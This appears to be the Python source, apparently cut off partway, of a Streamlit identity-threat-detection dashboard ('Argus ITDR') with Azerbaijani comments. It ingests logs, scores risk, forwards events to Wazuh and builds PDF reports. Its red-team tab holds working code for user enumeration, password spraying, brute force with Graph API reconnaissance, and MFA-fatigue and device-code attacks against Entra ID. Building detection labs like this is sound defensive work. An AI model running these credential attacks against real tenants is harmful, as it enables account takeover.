import streamlit as st
import pandas as pd
import requests
import time
import io
import json
import warnings
from pathlib import Path
from datetime import datetime
import plotly.express as px

# ReportLab Imports for PDF Generation
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable

from modules import config, storage
from modules.ai_generator import AIServiceSwitcher, row_to_entra_log

# --- ATTACK ENGINE İNTEQRASİYASI ---
attack_engine = None
attack_engine_error = None
try:
    from modules.attack_engine import IdentityAttackEngine, USERS_FILE, PASSWORDS_FILE, generate_wordlists

    generate_wordlists()
    attack_engine = IdentityAttackEngine(USERS_FILE, PASSWORDS_FILE)
except ImportError as e:
    attack_engine_error = f"Modul import xətası: {e}"
except RuntimeError as e:
    # Ən çox rastlanan hal: .env-də ARGUS_TENANT_ID / CLIENT_ID / CLIENT_SECRET yoxdur
    attack_engine_error = str(e)
except Exception as e:
    attack_engine_error = f"Gözlənilməz xəta: {e}"
# --------------------------------------------------------

# Streamlit Page Config
st.set_page_config(
    page_title="Argus ITDR - Identity Threat Detection",
    page_icon="🛡️",
    layout="wide"
)

if not config.WAZUH_VERIFY_SSL:
    # Self-signed sertifikatlı lokal Wazuh üçün SSL yoxlaması bağlıdırsa,
    # ən azı console-u xəbərdarlıq spam-ından qoruyaq və niyyəti aydın edək.
    # (Bu, wazuh_auditor.py-nin audit-trail oxumaları üçün hələ də lazımdır.)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ----------------------------------------------------------------------
# Argus -> Wazuh manager lokal fayl körpüsü
# ----------------------------------------------------------------------
_ARGUS_LOG_FILE = Path(config.ARGUS_LOG_DIR) / config.ARGUS_LOG_FILENAME


def send_to_wazuh(payload):
    """
    KÖK SƏBƏB DÜZƏLİŞİ: bu funksiya ARTIQ OpenSearch-ə birbaşa yazmır.

    Əvvəlki versiya hadisələri birbaşa "argus-itdr-events" adlı özəl
    OpenSearch indeksinə (WAZUH_ENDPOINT/_doc) POST edirdi. Bu texniki
    olaraq "uğurla" yazılsa da, sənəd heç vaxt Wazuh-un qayda mühərrikindən
    (rules engine) keçmirdi, ona görə də Wazuh Dashboard-un Overview və
    Threat Hunting ekranlarında (bunlar "wazuh-alerts-*" indeksinə baxır)
    HEÇ VAXT görünmürdü — "loqlar Wazuh-a getmir" probleminin əsl kök
    səbəbi bu idi.

    İndi hadisə lokal NDJSON fayla ("Argus log bridge") əlavə olunur.
    Wazuh manager bu faylı <localfile> bloku ilə tail edir, JSON kimi
    decode edir, local_rules.xml-dəki Argus qaydalarından keçirir və
    nəticəni əsl "wazuh-alerts-*" indeksinə yazır (bax: WAZUH_SETUP.md).

    Qaytarır: (ok: bool, data: dict | str-xəta-mesajı)

    ÇAĞIRAN KOD BU NƏTİCƏNİ MÜTLƏQ YOXLAMALIDIR. Tab 3 (Red Team Attack
    Controller) bunu artıq yoxlayır və Wazuh-un cavabından asılı olmayaraq
    "Attack execution completed" göstərmir — real yazma/fayl xətaları
    UI-da açıq görünür.
    """
    try:
        _ARGUS_LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(_ARGUS_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(payload, ensure_ascii=False) + "\n")
        return True, {"written": True, "file": str(_ARGUS_LOG_FILE)}
    except Exception as e:
        return False, str(e)


def detect_columns(df: pd.DataFrame) -> dict:
    """
    Fərqli mənbələrdən gələn log-larda sütun adlarını unifikasiya edir.
    Bütün tab-larda təkrarlanan eyni if/else zəncirinin əvəzinə tək yerdən idarə olunur.
    Tapılmayan sütun üçün None qaytarır (fərziyyə ilə mövcud olmayan sütuna
    müraciət edib crash almaq əvəzinə).
    """
    def pick(*candidates):
        for c in candidates:
            if c in df.columns:
                return c
        return None

    return {
        "event": pick("EventID", "event_id"),
        "user": pick("TargetUserName", "user", "TargetUser"),
        "ip": pick("IpAddress", "source_ip", "IP"),
    }


def classify_risk(event_value) -> str:
    """
    Ortaq risk təsnifat funksiyası — bütün tab-larda (Tab 2, Tab 4, Tab 5...) eyni
    məntiq istifadə olunsun deyə mərkəzləşdirilib.

    4624 (SUCCESS)  -> COMPROMISED : hücumçu artıq keçərli sessiya/token əldə edib.
                        Bu, ən yüksək prioritetli haldır (session revoke + disable lazımdır).
    4625 (FAILED)   -> ATTEMPTED   : davam edən/uğursuz hücum cəhdi, hələ kompromis yoxdur.
    digər/naməlum   -> UNKNOWN
    """
    val = str(event_value)
    if "4624" in val:
        return "COMPROMISED"
    if "4625" in val:
        return "ATTEMPTED"
    return "UNKNOWN"


def event_matches(series: pd.Series, code) -> pd.Series:
    """
    EventID sütununu tipdən asılı olmadan (int, str, ya da qarışıq) müqayisə edir.

    KÖK SƏBƏB QEYDİ: `series == 4624` kimi birbaşa bərabərlik müqayisəsi, sütun tipi
    dəyişəndə (məs. SQLite-dan string kimi yüklənəndə, halbuki attack_engine int
    yazır) SƏSSİZCƏ False qaytarır. Bu, Tab 4 Live Incident Feed-də faktiki
    kompromis olmuş (4624) istifadəçilərin səhvən "LOW" kimi göstərilməsinin əsl
    kök səbəbi idi. `.astype(str).str.contains()` isə tipdən asılı olmayaraq düzgün
    işləyir, ona görə bütün EventID müqayisələri bu funksiya üzərindən aparılmalıdır.
    (Eyni fix `modules/wazuh_auditor.py`-də `_event_matches()` adı ilə də tətbiq olunub.)
    """
    return series.astype(str).str.contains(str(code), na=False)


# PDF Generation Function
def generate_pdf_report(df, resolved_users, posture_score):
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(
        buffer,
        pagesize=letter,
        rightMargin=36,
        leftMargin=36,
        topMargin=36,
        bottomMargin=36
    )

    styles = getSampleStyleSheet()

    title_style = ParagraphStyle(
        'DocTitle', parent=styles['Heading1'], fontName='Helvetica-Bold',
        fontSize=20, textColor=colors.HexColor("#0E1117"), spaceAfter=6
    )
    subtitle_style = ParagraphStyle(
        'DocSubTitle', parent=styles['Normal'], fontName='Helvetica',
        fontSize=10, textColor=colors.HexColor("#555555"), spaceAfter=15
    )
    h2_style = ParagraphStyle(
        'SectionHeader', parent=styles['Heading2'], fontName='Helvetica-Bold',
        fontSize=14, textColor=colors.HexColor("#1F77B4"), spaceBefore=12, spaceAfter=8
    )
    body_style = ParagraphStyle(
        'BodyDark', parent=styles['Normal'], fontName='Helvetica',
        fontSize=9, textColor=colors.HexColor("#222222")
    )

    elements = []

    elements.append(Paragraph("🛡️ ARGUS ITDR - EXECUTIVE SECURITY AUDIT REPORT", title_style))
    elements.append(Paragraph(
        f"<b>Generated:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} | "
        f"<b>Engine:</b> Argus Security Analytics Platform", subtitle_style))
    elements.append(HRFlowable(width="100%", thickness=1.5, color=colors.HexColor("#1F77B4"), spaceAfter=15))

    cols = detect_columns(df)
    event_col = cols["event"]
    user_col = cols["user"] or "TargetUserName"
    ip_col = cols["ip"] or "IpAddress"

    total_events = len(df)
    failed_attempts = len(df[df[event_col].astype(str).str.contains('4625')]) if event_col else total_events
    compromised_attempts = len(df[df[event_col].astype(str).str.contains('4624')]) if event_col else 0
    remediated_count = len(resolved_users)

    summary_data = [
        [Paragraph("<b>Metric</b>", body_style), Paragraph("<b>Value</b>", body_style), Paragraph("<b>Status / Context</b>", body_style)],
        [Paragraph("Security Posture Score", body_style), Paragraph(f"<b>{posture_score} / 100</b>", body_style), Paragraph("Evaluated via Real-time Risk Engine", body_style)],
        [Paragraph("Total Ingested Events", body_style), Paragraph(str(total_events), body_style), Paragraph("Active Directory / Entra ID Telemetry", body_style)],
        [Paragraph("Failed Logon Attempts", body_style), Paragraph(str(failed_attempts), body_style), Paragraph("Event ID 4625 Anomalies Detected", body_style)],
        [Paragraph("Compromised Accounts (Successful Attack Logon)", body_style), Paragraph(str(compromised_attempts), body_style), Paragraph("Event ID 4624 — Attacker Holds Valid Session", body_style)],
        [Paragraph("Threats Remediated", body_style), Paragraph(str(remediated_count), body_style), Paragraph("Conditional Access & Token Revocation", body_style)]
    ]

    summary_table = Table(summary_data, colWidths=[180, 100, 260])
    summary_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#EAEAEA")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.black),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
        ('TOPPADDING', (0, 0), (-1, -1), 6),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#DDDDDD")),
    ]))

    elements.append(Paragraph("1. Executive Summary", h2_style))
    elements.append(summary_table)
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("2. Threat Analysis & Remediation Log", h2_style))

    table_data = [[
        Paragraph("<b>Target User</b>", body_style),
        Paragraph("<b>Attacker IP</b>", body_style),
        Paragraph("<b>Error Code</b>", body_style),
        Paragraph("<b>Method</b>", body_style),
        Paragraph("<b>Remediation Status</b>", body_style)
    ]]

    if not df.empty:
        for idx, row in df.iterrows():
            user = str(row.get(user_col, "Unknown"))
            ip = str(row.get(ip_col, "127.0.0.1"))
            err = str(row.get("ErrorCode", "AADSTS50126"))
            method = str(row.get("AuthMethod", "OAuth2/NTLM"))

            is_blocked = user in resolved_users
            status_text = "<b><font color='#28A745'>REMEDIATED (Blocked)</font></b>" if is_blocked else "<b><font color='#DC3545'>ACTIVE THREAT</font></b>"

            table_data.append([
                Paragraph(user, body_style),
                Paragraph(ip, body_style),
                Paragraph(err, body_style),
                Paragraph(method, body_style),
                Paragraph(status_text, body_style)
            ])

    threat_table = Table(table_data, colWidths=[110, 100, 90, 100, 140])
    threat_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#1F77B4")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 5),
        ('TOPPADDING', (0, 0), (-1, -1), 5),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#CCCCCC")),
    ]))

    elements.append(threat_table)
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("3. Hardening & Strategic Recommendations", h2_style))
    recs = [
        "<b>Enforce Phishing-Resistant MFA:</b> Upgrade identity scopes to require FIDO2 Security Keys or Certificate-Based Authentication.",
        "<b>Deploy Entra ID Protection Policies:</b> Enable automated Smart Lockout thresholds to block password spray IP pools dynamically.",
        "<b>Continuous SIEM Dispatch:</b> Ensure all failed authentication spikes are streaming live into Wazuh Indexer for active SOAR triage.",
        "<b>Session Invalidation:</b> Automatically revoke Active Refresh Tokens for any user accumulating >3 failed sign-ins within 60 seconds.",
        "<b>Compromised Account Priority:</b> Any account with a successful logon (4624) during an active attack window must be treated as CRITICAL and remediated before failed-attempt-only accounts."
    ]
    for r in recs:
        elements.append(Paragraph(f"• {r}", body_style))
        elements.append(Spacer(1, 4))

    doc.build(elements)
    buffer.seek(0)
    return buffer


# ----------------------------------------------------------------------
# Session state initialization — İNDİ SQLite-dan yüklənir (persistence)
# ----------------------------------------------------------------------
if 'df' not in st.session_state:
    persisted_df = storage.load_events()
    if persisted_df.empty:
        persisted_df = pd.DataFrame(columns=storage.EVENT_COLUMNS)
    st.session_state['df'] = persisted_df

if 'resolved_users' not in st.session_state:
    st.session_state['resolved_users'] = storage.load_resolved_users()

st.title("🛡️ Argus ITDR - Identity Threat Detection & Response")
st.caption("Real-time Identity Log Analysis, Dynamic Risk Scoring, Analytics & SIEM Integration")

tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
    "📥 Live Log Ingestion",
    "🤖 AI Threat Analysis & Auto-Fix",
    "⚔️ Red Team Attack Controller",
    "🛡️ Blue Team & ITDR Dashboard",
    "📊 Interactive Analytics",
    "🎯 Threat Detection Engine",
    "⚙️ SIEM Integration Test",
    "📄 Security Audit Report"
])

# TAB 1: Live Log Ingestion
with tab1:
    st.header("Active Directory & Identity Logs")

    col_upload, col_reset = st.columns([4, 1])
    with col_upload:
        uploaded_file = st.file_uploader("Upload CSV Log File", type=["csv"])
    with col_reset:
        st.write("")  # dikey boşluq — düyməni upload sahəsi ilə tərəf-tərəf düzləndirir
        st.write("")
        if st.button("🧹 Clear / Reset Telemetry", help="Yaddaşdakı bütün event-ləri və remediation tarixçəsini təmizləyir."):
            st.session_state['df'] = pd.DataFrame(columns=storage.EVENT_COLUMNS)
            st.session_state['resolved_users'] = set()

            cleared_persisted = False
            for fn_name in ("clear_events", "reset_events", "delete_all_events"):
                fn = getattr(storage, fn_name, None)
                if callable(fn):
                    try:
                        fn()
                        cleared_persisted = True
                        break
                    except Exception:
                        pass
            for fn_name in ("clear_resolved_users", "reset_resolved_users"):
                fn = getattr(storage, fn_name, None)
                if callable(fn):
                    try:
                        fn()
                    except Exception:
                        pass

            if cleared_persisted:
                st.success("✅ Sessiya yaddaşı VƏ SQLite tarixçəsi təmizləndi.")
            else:
                st.warning("⚠️ Sessiya yaddaşı təmizləndi. `modules/storage.py`-də "
                            "`clear_events()` funksiyası tapılmadığı üçün SQLite-dakı köhnə "
                            "tarixçə səhifə yenilənəndə yenidən yüklənə bilər.")
            st.rerun()

    if uploaded_file is not None:
        df = pd.read_csv(uploaded_file)
        st.session_state['df'] = df
        storage.append_events(df)
        st.subheader("Raw Identity Events")
        st.dataframe(df, use_container_width=True)
    else:
        if not st.session_state['df'].empty:
            st.subheader("Current Telemetry Logs in Memory")
            st.caption("↕️ Ən yeni hadisələr yuxarıda göstərilir (son hücum run-unu köhnə nəticələrdən ayırd etmək üçün).")
            live_df = st.session_state['df']
            if 'Timestamp' in live_df.columns:
                live_df = live_df.sort_values('Timestamp', ascending=False)
            else:
                live_df = live_df.iloc[::-1]
            st.dataframe(live_df, use_container_width=True)
        else:
            st.info("Upload identity telemetry CSV logs or use the Red Team Attack Controller to generate live attack logs.")

# TAB 2: AI Threat Analysis & Auto-Fix
with tab2:
    st.header("🤖 AI Threat Analysis & Remediation")

    if not config.ENABLE_REAL_REMEDIATION:
        st.caption("ℹ️ Hazırda **SIMULATION MODE**-dadır (`.env`-də `ENABLE_REAL_REMEDIATION=false`). "
                   "Remediation düymələri real Entra ID dəyişikliyi ETMİR, yalnız Wazuh-a log göndərir.")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        cols = detect_columns(df)
        event_col, user_col, ip_col = cols["event"], cols["user"], cols["ip"]

        # Ən yeni hadisələr əvvəldə görünsün — Timestamp varsa ona görə,
        # yoxdursa DataFrame-ə əlavə olunma sırasına görə (sonuncu əlavə = ən yeni)
        if 'Timestamp' in df.columns:
            df = df.sort_values('Timestamp', ascending=False)
        else:
            df = df.iloc[::-1]

        if event_col:
            # Uğursuz cəhdlər = davam edən hücum cəhdi (ATTEMPTED)
            failed_mask = df[event_col].astype(str).str.contains('4625')
            # Uğurlu login = faktiki kompromis olmuş hesab (COMPROMISED) — daha yüksək prioritet!
            success_mask = df[event_col].astype(str).str.contains('4624')

            threat_df = df[failed_mask | success_mask].copy()
            threat_df['_risk_level'] = threat_df[event_col].apply(classify_risk)
            # Kompromis olanlar (COMPROMISED) əvvəldə görünsün; eyni risk səviyyəsi daxilində
            # isə artıq yuxarıda tətbiq olunan "ən yeni əvvəldə" sırası qorunsun (stable sort)
            threat_df = threat_df.sort_values(
                '_risk_level', key=lambda s: s.map({'COMPROMISED': 0, 'ATTEMPTED': 1}).fillna(2),
                kind='mergesort'
            )

            failed_attempts = int(failed_mask.sum())
            compromised_count = int(success_mask.sum())
        else:
            failed_attempts = len(df)
            compromised_count = 0
            threat_df = df

        resolved_count = len(st.session_state['resolved_users'])
        # Kompromis olmuş hesablar daha ağır risk daşıyır, ona görə skor cəzasında ayrıca çəkilir
        active_failures = max(0, failed_attempts - resolved_count)
        active_compromised = max(0, compromised_count - resolved_count)
        calculated_score = max(0, 100 - (active_failures * 10) - (active_compromised * 20))

        if calculated_score >= 80:
            risk_label = "Low Risk (Healthy Environment)"
        elif calculated_score >= 50:
            risk_label = "Medium Risk (Suspicious Activity)"
        else:
            risk_label = "Critical Risk (Active Threat Detected)"

        col1, col2, col3, col4 = st.columns(4)
        with col1:
            st.metric(
                label="Real-time Security Posture Score",
                value=f"{calculated_score} / 100",
                delta=risk_label,
                delta_color="normal" if calculated_score >= 80 else "inverse"
            )
        with col2:
            st.metric(label="Active Identity Threats", value=f"{active_failures} Events")
        with col3:
            st.metric(label="🔓 Compromised Accounts", value=f"{active_compromised} Users", delta_color="inverse")
        with col4:
            st.metric(label="Threats Remediated", value=f"{resolved_count} Users Blocked")

        st.markdown("---")
        st.subheader("💡 Dynamic Remediation Guidance & Action")

        if len(threat_df) == 0:
            st.success("✅ No active identity threats detected in telemetry.")
        else:
            for idx, row in threat_df.iterrows():
                user = str(row.get(user_col, f"User_{idx}")) if user_col else "Unknown User"
                ip = str(row.get(ip_col, "185.220.101.5")) if ip_col else "185.220.101.5"
                auth_method = row.get("AuthMethod", "OAuth2/NTLM")
                err_code = row.get("ErrorCode", "AADSTS50126")
                risk_level = row.get('_risk_level', 'ATTEMPTED')

                is_resolved = user in st.session_state['resolved_users']

                label_icon = "🔴 COMPROMISED" if risk_level == 'COMPROMISED' else "⚠️ ATTEMPTED"
                event_label = "4624 (SUCCESS)" if risk_level == 'COMPROMISED' else "4625 (FAILED)"

                with st.expander(
                    f"{label_icon} **Target User:** {user} | **Event ID:** {event_label} | **Error:** {err_code} | **IP:** {ip}",
                    expanded=not is_resolved
                ):
                    if is_resolved:
                        st.success(f"✅ Remediation already applied for `{user}`.")
                    else:
                        if risk_level == 'COMPROMISED':
                            st.error(f"🚨 **CRITICAL:** `{user}` SUCCESSFULLY authenticated via `{auth_method}` — account is actively compromised!")
                            st.info(f"🤖 **Suggested Action:** IMMEDIATELY revoke sessions and disable `{user}` — attacker may already hold a valid token.")
                        else:
                            st.error(f"🚨 **Risk Assessment:** Active Threat Detected on `{user}` via `{auth_method}`!")
                            st.info(f"🤖 **Suggested Action:** Revoke all Active Refresh Tokens and trigger Conditional Access Lockout for `{user}`.")

                        # --- İKİ DÜYMƏ ÜÇÜN SÜTUNLAR ---
                        col_a, col_b = st.columns(2)

                        # Sütun A: MÖVCUD REMEDIATION DÜYMƏSİ
                        with col_a:
                            if st.button(f"🚫 Execute Remediation ({user})", key=f"btn_ai_block_{idx}_{user}"):
                                use_real = config.ENABLE_REAL_REMEDIATION and attack_engine is not None

                                if use_real:
                                    ok1, msg1 = attack_engine.revoke_sign_in_sessions(user)
                                    ok2, msg2 = attack_engine.disable_account(user)
                                    real_ok = ok1 and ok2
                                    detail = f"{msg1} | {msg2}"
                                    mode = "REAL"
                                else:
                                    real_ok = True
                                    detail = "Simulation mode: no real Entra ID change was made."
                                    mode = "SIMULATION"

                                alert_payload = {
                                    "timestamp": datetime.utcnow().isoformat() + "Z",
                                    "event_type": "REMEDIATION_EXECUTION",
                                    "target_user": user,
                                    "source_ip": ip,
                                    "risk_level": risk_level,
                                    "action_taken": "ACCOUNT_DISABLED_ENTRA_ID" if mode == "REAL" else "SIMULATED_LOCKOUT",
                                    "triggered_by": "Argus-Engine",
                                    "status": "SUCCESS" if real_ok else "FAILED",
                                    "detail": detail,
                                    "mode": mode,
                                }
                                wazuh_ok, wazuh_detail = send_to_wazuh(alert_payload)

                                if real_ok:
                                    st.session_state['resolved_users'].add(user)
                                    storage.add_resolved_user(user)
                                    st.success(f"✅ [{mode}] {detail}")
                                else:
                                    st.error(f"❌ [{mode}] {detail}")

                                if wazuh_ok:
                                    st.caption("📡 Remediation event Wazuh-a uğurla göndərildi.")
                                else:
                                    st.warning(f"⚠️ Remediation event Wazuh-a GÖNDƏRİLMƏDİ: {wazuh_detail}")
                                st.rerun()

                        # Sütun B: YENİ SIGMA RULE GENERATION DÜYMƏSİ
                        with col_b:
                            if st.button(f"🧠 Generate Sigma Rule ({user})", key=f"btn_sigma_{idx}_{user}"):
                                try:
                                    with st.spinner("AI Sigma qaydası generasiya edir..."):
                                        engine_ai = AIServiceSwitcher()
                                        entra_log = row_to_entra_log(row.to_dict())
                                        result = engine_ai.generate_and_validate(entra_log)

                                    if result["ok"]:
                                        st.code(result["yaml"], language="yaml")
                                        if result["valid_sigma"]:
                                            st.success("✅ pySigma validasiyasından keçdi.")
                                        else:
                                            st.warning(f"⚠️ Sigma sintaksis xəbərdarlığı: {result['error']}")
                                    else:
                                        st.error(f"❌ Generasiya alınmadı: {result['error']}")
                                except Exception as e:
                                    st.error(f"❌ AI Generator xətası: {e}")
    else:
        st.warning("⚠️ No logs ingested or generated yet. Upload CSV or run Red Team Attack Simulation.")
# TAB 3: Red Team Attack Controller & Simulation Engine
with tab3:
    st.header("⚔️ Red Team Attack Controller & Simulation Engine")
    st.caption("Execute MSAL authentication attacks against your own Microsoft Entra ID test tenant.")

    if attack_engine is None:
        st.error(
            "❌ Attack Engine yüklənmədi: "
            f"{attack_engine_error or 'naməlum xəta'}\n\n"
            "`.env` faylında `ARGUS_TENANT_ID`, `ARGUS_CLIENT_ID`, `ARGUS_CLIENT_SECRET` "
            "dəyərlərini doldurduğunuzdan əmin olun."
        )

    # DƏYİŞİKLİK: əvvəllər burada "WAZUH_PASSWORD boşdursa heç nə göndərilməyəcək"
    # xəbərdarlığı var idi — bu artıq YANLIŞ, çünki send_to_wazuh() indi WAZUH_PASSWORD-dən
    # asılı deyil (lokal fayla yazır). Bunun yerinə həqiqi ötürücünü göstəririk.
    st.caption(
        f"📡 Hadisələr Wazuh manager-in tail etdiyi lokal fayla yazılır: `{_ARGUS_LOG_FILE}`. "
        "Bu qovluq docker-compose-da `wazuh.manager` konteynerinin `/var/log/argus` qovluğuna "
        "bind-mount edilməlidir və `local_rules.xml` manager-ə yüklənməlidir (bax: `WAZUH_SETUP.md`)."
    )

    col_left, col_right = st.columns([1, 1])

    with col_left:
        st.subheader("⚙️ Custom Attack Parameters")
        default_domain = config.DOMAIN or "example.onmicrosoft.com"
        target_user_input = st.text_input("Target User (for Brute Force / MFA)", value=f"user2@{default_domain}")
        spray_password_input = st.text_input("Spray Password", value="")
        max_targets_count = st.slider("Max Target Limit", min_value=1, max_value=50, value=18)

        st.markdown("---")
        st.subheader("🎯 Attack Triggers")

        btn_enum = st.button("🔍 Launch User Enumeration", disabled=attack_engine is None)
        btn_spray = st.button("🚀 Launch Password Spray Attack", disabled=attack_engine is None)
        btn_brute = st.button("🔨 Launch Brute Force Attack", disabled=attack_engine is None)
        btn_mfa = st.button("📲 Launch MFA Fatigue Simulation", disabled=attack_engine is None)
        btn_device = st.button("🔑 Launch Device Code Flow Phishing", disabled=attack_engine is None)

    with col_right:
        st.subheader("🖥️ Live Attack Terminal Console (`attack_engine.py`)")
        terminal_placeholder = st.empty()

        terminal_placeholder.code(
            "[+] Attack Engine Initialized...\n"
            f"[+] Target Domain: {config.DOMAIN or '(not configured)'}\n"
            "[*] Ready to execute authentication attempts against Entra ID.",
            language="bash"
        )

    if attack_engine is not None and (btn_enum or btn_spray or btn_brute or btn_mfa or btn_device):
        console_logs = []
        new_events = []

        if btn_enum:
            console_logs.append(f"[*] Executing User Enumeration (Max: {max_targets_count})...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            for user in attack_engine.users[:max_targets_count]:
                result = attack_engine.public_app.acquire_token_by_username_password(
                    username=user, password="DummyPassword123!", scopes=["https://graph.microsoft.com/.default"]
                )
                err_desc = result.get("error_description", "")
                if any(code in err_desc for code in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
                    status_text = f"[+] MÖVCUDDUR (Valid User): {user}"
                elif "AADSTS50034" in err_desc:
                    status_text = f"[-] MÖVCUD DEYİL (Invalid User): {user}"
                else:
                    status_text = f"[?] CAVAB ({user}): {err_desc[:40]}..."

                console_logs.append(status_text)
                terminal_placeholder.code("\n".join(console_logs), language="bash")

        elif btn_spray:
            if not spray_password_input:
                st.warning("Spray Password boşdur — sınaq üçün bir şifrə daxil edin.")
            else:
                console_logs.append(f"[*] Executing Password Spray...\n")
                terminal_placeholder.code("\n".join(console_logs), language="bash")

                for user in attack_engine.users[:max_targets_count]:
                    result = attack_engine.public_app.acquire_token_by_username_password(
                        username=user, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
                    )
                    if "access_token" in result:
                        res_line = f"[+] UĞURLU: {user}"
                        evt_id = 4624
                        status = "SUCCESS"
                    else:
                        err = result.get("error_description", "").splitlines()[0]
                        res_line = f"[-] UĞURSUZ: {user} -> ({err[:40]}...)"
                        evt_id = 4625
                        status = "FAILED"

                    console_logs.append(res_line)
                    terminal_placeholder.code("\n".join(console_logs), language="bash")

                    new_events.append({
                        "EventID": evt_id,
                        "TargetUserName": user,
                        "IpAddress": "185.220.101.5",
                        "Status": status,
                        "AuthMethod": "PasswordSpray",
                        "ErrorCode": result.get("error", "None"),
                        "Timestamp": datetime.utcnow().isoformat() + "Z"
                    })

        elif btn_brute:
            console_logs.append(f"[*] Executing Brute Force against {target_user_input}...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            test_passwords = attack_engine.passwords[:5]
            for pwd in test_passwords:
                result = attack_engine.public_app.acquire_token_by_username_password(
                    username=target_user_input, password=pwd, scopes=["https://graph.microsoft.com/.default"]
                )
                if "access_token" in result:
                    console_logs.append(f"[+] UĞURLU: Doğru şifrə tapıldı -> '{pwd}'")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")

                    console_logs.append("\n[*] Running Post-Exploitation Reconnaissance...")
                    headers = {"Authorization": f"Bearer {result['access_token']}"}
                    resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
                    if resp.status_code == 200:
                        u_data = resp.json()
                        console_logs.append(f"[+] User Info Retrieved: {u_data.get('displayName')} ({u_data.get('userPrincipalName')})")
                    break
                else:
                    err = result.get("error_description", "").splitlines()[0]
                    console_logs.append(f"[-] UĞURSUZ: {pwd} -> ({err[:35]}...)")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                time.sleep(0.5)

        elif btn_mfa:
            console_logs.append(f"[*] Executing MFA Fatigue Simulation against {target_user_input}...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            if not spray_password_input:
                st.warning("MFA simulyasiyası üçün Spray Password sahəsinə hədəfin bilinən şifrəsini daxil edin.")
            else:
                for i in range(1, 3):
                    console_logs.append(f"[*] Attempt #{i}...")
                    result = attack_engine.public_app.acquire_token_by_username_password(
                        username=target_user_input, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
                    )
                    err_desc = result.get("error_description", "")
                    first_line = err_desc.splitlines()[0] if err_desc else "Success/Token"
                    console_logs.append(f" └─ Response: {first_line[:55]}...")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                    time.sleep(1)

        elif btn_device:
            console_logs.append("[*] Initiating OAuth Device Code Flow...\n")
            flow = attack_engine.public_app.initiate_device_flow(scopes=["https://graph.microsoft.com/.default"])
            if "user_code" in flow:
                console_logs.append(f"[+] Verification URL: {flow['verification_uri']}")
                console_logs.append(f"[+] User Code: {flow['user_code']}")
            else:
                console_logs.append("[-] Device Code Flow initiation failed.")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

        if new_events:
            new_df = pd.DataFrame(new_events)
            st.session_state['df'] = pd.concat([st.session_state['df'], new_df], ignore_index=True)
            storage.append_events(new_df)

            # ------------------------------------------------------------
            # BUG FIX: bundan əvvəl bu loop-un nəticəsi HEÇ YOXLANMIRDI və
            # aşağıda "Attack execution completed" mesajı Wazuh-un cavabından
            # asılı olmayaraq HƏMİŞƏ göstərilirdi. İndi hər hadisənin nəticəsi
            # sayılır və uğursuzluqda dəqiq HTTP/bağlantı xətası UI-da göstərilir.
            # ------------------------------------------------------------
            wazuh_ok_count = 0
            wazuh_fail_count = 0
            wazuh_errors = []

            for ev in new_events:
                wazuh_ok, wazuh_result = send_to_wazuh({
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                    "event_id": ev["EventID"],
                    "user": ev["TargetUserName"],
                    "source_ip": ev["IpAddress"],
                    "rule_title": "RedTeam MSAL Attack Executed",
                    "severity": "HIGH",
                    "source": "Argus-RedTeam-Engine"
                })
                if wazuh_ok:
                    wazuh_ok_count += 1
                else:
                    wazuh_fail_count += 1
                    wazuh_errors.append(f"{ev['TargetUserName']}: {wazuh_result}")

            console_logs.append(f"\n[*] Wazuh dispatch: {wazuh_ok_count} OK, {wazuh_fail_count} FAILED")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            if wazuh_fail_count == 0:
                st.success(f"✅ Attack execution completed — {wazuh_ok_count} events written to the Argus log bridge.")
            else:
                st.error(
                    f"⚠️ Attack execution completed, but {wazuh_fail_count}/{len(new_events)} "
                    f"events FAILED to reach the Argus log bridge."
                )
                with st.expander("🔎 Wazuh dispatch error details (root cause)"):
                    for err in wazuh_errors:
                        st.code(err)
                    st.caption(
                        "Tipik səbəblər: `ARGUS_LOG_DIR` yazıla bilən deyil, disk dolub, "
                        "və ya proses o qovluğa yazmaq icazəsinə malik deyil."
                    )
        else:
            st.success("Attack execution completed.")

# TAB 4: Blue Team & ITDR Dashboard
with tab4:
    st.header("🛡️ Blue Team & ITDR Monitoring Dashboard")
    st.caption("📜 **All-Time History** — bu dashboard bütün əvvəlki hücum run-larının məlumatını (SQLite-da persist olunmuş) birlikdə göstərir, "
               "təkcə son run-u deyil. Yalnız indiki run-a baxmaq üçün Tab 1 və Tab 2-yə keçin (ən yeni yuxarıda sıralanır).")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
